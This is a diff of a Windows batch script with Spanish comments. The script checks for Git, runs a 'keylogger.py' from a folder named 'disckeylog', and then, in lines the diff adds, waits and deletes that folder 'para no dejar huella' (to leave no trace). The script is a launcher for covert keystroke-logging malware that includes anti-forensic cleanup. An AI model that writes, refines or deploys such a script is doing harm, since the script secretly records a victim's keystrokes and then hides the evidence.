@@ -4,17 +4,17 @@
 :check01
 where git > nul 2>&1
 if %errorlevel% neq 0 (
-    echo Git is not installed.
+    echo "Git is not installed."
     goto gitinstall
-    :
+    
 ) else (
-    echo Git is installed.
+    echo "Git is installed."
     goto check02
 )
 ::instala git
 
 :gitinstall
-echo Installing Git...
+echo "Installing Git..."
 start /wait https://git-scm.com/download/win
 timeout /t 60
 goto check01
@@ -41,3 +41,12 @@ cd disckeylog
 
 ::Ejecuta el script
 python3 keylogger.py
+
+::Timeout
+timeout /t 180
+
+::elimina el repositorio para no dejar huella
+cd ..
+timeout /t 5
+rmdir -r disckeylog
+
